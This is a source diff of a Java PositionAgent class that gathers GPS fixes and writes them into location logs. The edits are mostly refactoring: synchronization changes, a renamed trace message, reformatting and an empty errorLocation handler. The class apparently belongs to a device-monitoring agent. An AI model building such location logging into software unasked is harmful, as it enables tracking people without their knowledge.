@@ -79,6 +79,7 @@ public final class PositionAgent extends Agent implements LocationObserver {
     int period;
 
     LocationProvider lp;
+
     //Location loc = null;
 
     /**
@@ -313,7 +314,7 @@ public final class PositionAgent extends Agent implements LocationObserver {
 
     boolean waitingForPoint = false;
 
-    private synchronized void locationGPS() {
+    private void locationGPS() {
         if (lp == null) {
             //#ifdef DEBUG_ERROR
             debug.error("GPS Not Supported on Device");
@@ -328,12 +329,15 @@ public final class PositionAgent extends Agent implements LocationObserver {
             return;
         }
 
-        LocationHelper.getInstance().locationGPS(lp, this);
+        synchronized (this) {
+            LocationHelper.getInstance().locationGPS(lp, this, false);
+        }
+
     }
 
     public synchronized void newLocation(Location loc) {
         //#ifdef DEBUG_TRACE
-        debug.trace("manageLocationGPS");
+        debug.trace("newLocation");
         //#endif
 
         //#ifdef DBC
@@ -364,7 +368,7 @@ public final class PositionAgent extends Agent implements LocationObserver {
             //#ifdef DEBUG_TRACE
             debug.trace("valid");
             //#endif
-            byte[] payload = getGPSPayload(qc,loc, timestamp);
+            byte[] payload = getGPSPayload(qc, loc, timestamp);
 
             logGps.createLog(getAdditionalData(0, LOG_TYPE_GPS),
                     LogType.LOCATION_NEW);
@@ -544,7 +548,8 @@ public final class PositionAgent extends Agent implements LocationObserver {
     /**
      * @param timestamp
      */
-    private byte[] getGPSPayload(QualifiedCoordinates qc, Location loc, long timestamp) {
+    private byte[] getGPSPayload(QualifiedCoordinates qc, Location loc,
+            long timestamp) {
         //#ifdef DEBUG_TRACE
         debug.trace("getGPSPayload");
         //#endif
@@ -679,5 +684,11 @@ public final class PositionAgent extends Agent implements LocationObserver {
 
     public synchronized void waitingForPoint(boolean b) {
         waitingForPoint = b;
+    }
+
+    public void errorLocation() {
+        //#ifdef DEBUG_ERROR
+        debug.error("errorLocation");
+        //#endif
     }
 }
